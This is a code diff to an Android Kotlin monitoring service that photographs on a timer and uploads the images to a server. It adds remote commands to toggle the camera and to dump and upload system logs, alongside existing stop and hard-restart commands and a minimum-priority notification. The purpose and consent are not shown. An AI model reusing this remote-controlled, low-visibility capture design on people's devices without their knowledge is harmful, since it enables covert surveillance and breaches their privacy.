@@ -35,6 +35,7 @@ class MonitoringService : LifecycleService() {
     @Volatile private var currentPhotoInterval = 60 // 預設 60 秒
     @Volatile private var isCapturing = false
     @Volatile private var isShuttingDown = false
+    @Volatile private var isCameraEnabled = true // 🌟 相機開關狀態
     
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var photoJob: Job? = null
@@ -79,18 +80,33 @@ class MonitoringService : LifecycleService() {
                 
                 currentPhotoInterval = newInterval
                 Log.d(TAG, "✅ 頻率已成功更新為: $currentPhotoInterval 秒")
-                startPhotoLoop() 
+                if (isCameraEnabled) startPhotoLoop() 
                 
-                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, false)
+                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
             }
             "STOP_SERVICE" -> executeSelfDestruct()
             "RESTART_APP" -> executeRestart()
+            "SET_CAMERA_STATE" -> {
+                isCameraEnabled = (value == "ON")
+                if (isCameraEnabled) {
+                    Log.d(TAG, "▶️ 恢復定時拍照")
+                    startPhotoLoop()
+                } else {
+                    Log.d(TAG, "⏸️ 暫停定時拍照")
+                    photoJob?.cancel() // 取消拍照任務
+                }
+                // 立刻發送心跳回報最新狀態
+                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
+            }
+            "FETCH_LOG" -> fetchAndUploadLog()
             else -> Log.w(TAG, "未知指令: $command")
         }
     }
 
     private fun startPhotoLoop() {
         photoJob?.cancel()
+        if (!isCameraEnabled) return
+
         photoJob = serviceScope.launch {
             while (imageCapture == null && isActive) {
                 Log.d(TAG, "⏳ 拍照任務等待中：相機尚未綁定...")
@@ -98,7 +114,7 @@ class MonitoringService : LifecycleService() {
             }
 
             while (isActive) {
-                if (isRunning) {
+                if (isRunning && isCameraEnabled) {
                     takePhotoAndUpload()
                 }
                 delay(currentPhotoInterval * 1000L)
@@ -110,8 +126,28 @@ class MonitoringService : LifecycleService() {
         serviceScope.launch {
             while (isActive) {
                 Log.d(TAG, "💓 觸發獨立心跳包...")
-                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval)
+                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
                 delay(10_000L)
+            }
+        }
+    }
+
+    private fun fetchAndUploadLog() {
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                Log.d(TAG, "📄 正在擷取系統 Log...")
+                // 抓取最近 500 行
+                val process = Runtime.getRuntime().exec("logcat -d -t 500")
+                val logFile = File(cacheDir, "log_${System.currentTimeMillis()}.txt")
+                
+                process.inputStream.bufferedReader().use { reader ->
+                    logFile.writeText(reader.readText())
+                }
+                
+                Log.d(TAG, "✅ Log 擷取完成，大小: ${logFile.length()} bytes，準備上傳")
+                uploadToServer(logFile)
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ 抓取 Log 失敗", e)
             }
         }
     }
@@ -127,18 +163,15 @@ class MonitoringService : LifecycleService() {
 
         CoroutineScope(Dispatchers.IO).launch {
             Log.w(TAG, "📤 正在同步發送最後遺言...")
-            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true)
+            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true, isCameraEnabled = isCameraEnabled)
 
             withContext(Dispatchers.Main) {
                 try {
                     WorkManager.getInstance(applicationContext).cancelAllWork()
-                    
                     stopForeground(STOP_FOREGROUND_REMOVE)
-                    
                     wakeLock?.let { if (it.isHeld) it.release() }
                     stopSelf()
-                    Log.w(TAG, "⚰️ 服務已成功呼叫 stopSelf()，等待系統回收")
-                    
+                    Log.w(TAG, "⚰️ 服務已成功呼叫 stopSelf()")
                 } catch (e: Exception) {
                     Log.e(TAG, "清理程序發生異常", e)
                 }
@@ -155,44 +188,31 @@ class MonitoringService : LifecycleService() {
         serviceScope.cancel()
 
         Thread {
-            // 1. 同步發送重啟確認
             Log.w(TAG, "📤 正在發送重啟確認...")
-            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = false, isRestarting = true)
+            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = false, isRestarting = true, isCameraEnabled = isCameraEnabled)
 
             Handler(Looper.getMainLooper()).post {
                 try {
-                    // 2. 🌟 設定 AlarmManager 鬧鐘，3 秒後喚醒自己
                     val restartIntent = Intent(applicationContext, MonitoringService::class.java)
                     val pendingIntent = PendingIntent.getService(
-                        applicationContext,
-                        12345, // 請求碼
-                        restartIntent,
+                        applicationContext, 12345, restartIntent,
                         PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                     )
 
                     val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
-                    
-                    // Android 12+ (API 31) 對精確鬧鐘有嚴格限制
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                         if (alarmManager.canScheduleExactAlarms()) {
                             alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                         } else {
-                            // 若無權限則退而求其次使用不精確鬧鐘
                             alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                         }
                     } else {
                         alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                     }
 
-                    Log.w(TAG, "⏰ 已設定重啟鬧鐘，準備關閉當前進程...")
-
-                    // 3. 拔除當前通知並關閉服務
                     stopForeground(STOP_FOREGROUND_REMOVE)
                     stopSelf()
-
-                    // 4. 💥 殺死當前進程 (達到真正的 Hard Restart)
                     android.os.Process.killProcess(android.os.Process.myPid())
-
                 } catch (e: Exception) {
                     Log.e(TAG, "重啟設定失敗", e)
                 }
@@ -222,13 +242,9 @@ class MonitoringService : LifecycleService() {
     }
 
     private fun takePhotoAndUpload() {
-        if (isCapturing) {
-            Log.w(TAG, "⏳ 相機仍在處理上一張照片，跳過此次拍攝")
-            return
-        }
+        if (isCapturing || !isCameraEnabled) return
         
         val imageCapture = imageCapture ?: return
-        
         cleanUpOldFiles(cacheDir)
         
         isCapturing = true
@@ -257,9 +273,14 @@ class MonitoringService : LifecycleService() {
 
     private fun uploadToServer(file: File) {
         val client = OkHttpClient()
+        
+        // 確保 if-else 結構完整
+        val mediaTypeStr = if (file.name.endsWith(".txt")) "text/plain" else "image/jpeg"
+        val mediaType = mediaTypeStr.toMediaTypeOrNull()
+
         val requestBody = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
-            .addFormDataPart("file", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
+            .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
             .build()
 
         val request = Request.Builder().url(serverUrl).post(requestBody).build()
@@ -269,14 +290,19 @@ class MonitoringService : LifecycleService() {
                 Log.e(TAG, "❌ 上傳失敗 | 檔案: ${file.name} | 原因: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
-                response.use { 
-                    if (it.isSuccessful) {
-                        Log.d(TAG, "🚀 上傳成功")
+                response.use { resp ->
+                    if (resp.isSuccessful) {
+                        Log.d(TAG, "🚀 上傳成功: ${file.name}")
                         if (file.exists()) file.delete()
-                        successUploadCount++
+                        if (file.name.endsWith(".jpg")) {
+                            successUploadCount++
+                        }
                     } else {
-                        Log.e(TAG, "⚠️ 上傳失敗，狀態碼: ${it.code}")
+                        Log.e(TAG, "⚠️ 上傳失敗，狀態碼: ${resp.code}")
                     }
+                    // 🌟 明確回傳 Unit，確保 if 不會被當作 lambda 的表達式回傳值
+                    @Suppress("UNUSED_EXPRESSION")
+                    Unit
                 }
             }
         })
@@ -289,14 +315,12 @@ class MonitoringService : LifecycleService() {
         val maxSizeBytes = maxSizeMB * 1024 * 1024L
         if (totalSizeBytes <= maxSizeBytes) return
 
-        Log.w(TAG, "⚠️ 快取資料夾超過限制，準備清理舊檔案...")
         val sortedFiles = files.sortedBy { it.lastModified() }
         for (file in sortedFiles) {
             if (totalSizeBytes <= maxSizeBytes) break
             val fileSize = file.length()
             if (file.delete()) {
                 totalSizeBytes -= fileSize
-                Log.d(TAG, "🗑️ 已刪除舊檔案: ${file.name}")
             }
         }
     }
@@ -310,9 +334,7 @@ class MonitoringService : LifecycleService() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID, "即時監控服務", NotificationManager.IMPORTANCE_MIN
-            )
+            val channel = NotificationChannel(CHANNEL_ID, "即時監控服務", NotificationManager.IMPORTANCE_MIN)
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
         }
@@ -321,23 +343,19 @@ class MonitoringService : LifecycleService() {
     private fun createNotification(): Notification {
         val intent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
-        
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(R.drawable.min)
             .setShowWhen(false)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pendingIntent)
             .build()
     }
 
     override fun onDestroy() {
-        Log.w(TAG, "⚠️ 服務即將銷毀 (onDestroy)")
         if (!isShuttingDown) {
             isShuttingDown = true
-            Log.w(TAG, "🛑 [本機中斷] 發送服務已中斷訊號給伺服器...")
             Thread {
-                statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true)
+                statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true, isCameraEnabled = isCameraEnabled)
             }.start()
         }
         isRunning = false
@@ -345,7 +363,6 @@ class MonitoringService : LifecycleService() {
         photoJob?.cancel()
         wakeLock?.let { if (it.isHeld) it.release() }
         cameraExecutor.shutdown()
-        Log.d(TAG, "服務已關閉")
         super.onDestroy()
     }
 }
